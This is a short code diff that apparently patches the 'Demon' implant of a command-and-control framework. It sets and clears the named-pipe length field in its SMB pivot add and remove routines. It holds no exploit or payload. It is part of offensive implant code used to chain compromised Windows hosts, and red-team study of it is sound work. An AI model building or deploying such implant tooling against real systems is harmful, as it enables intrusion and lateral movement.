@@ -82,6 +82,7 @@ BOOL PivotAdd( BUFFER NamedPipe, PVOID* Output, PSIZE_T BytesSize )
         Data->Next            = NULL;
         Data->DemonID         = PivotParseDemonID( *Output, *BytesSize );
         Data->PipeName.Buffer = Instance.Win32.LocalAlloc( LPTR, NamedPipe.Length );
+        Data->PipeName.Length = NamedPipe.Length;
         MemCopy( Data->PipeName.Buffer, NamedPipe.Buffer, NamedPipe.Length );
 
         if ( ! Instance.SmbPivots )
@@ -160,6 +161,7 @@ BOOL PivotRemove( DWORD AgentId )
         }
 
         Instance.SmbPivots->PipeName.Buffer = NULL;
+        Instance.SmbPivots->PipeName.Length = 0;
         Instance.SmbPivots->Handle          = NULL;
         Instance.SmbPivots->DemonID         = 0;
 
@@ -191,6 +193,7 @@ BOOL PivotRemove( DWORD AgentId )
                 }
 
                 PivotData->PipeName.Buffer = NULL;
+                PivotData->PipeName.Length = 0;
                 PivotData->Handle          = NULL;
                 PivotData->DemonID         = 0;
 
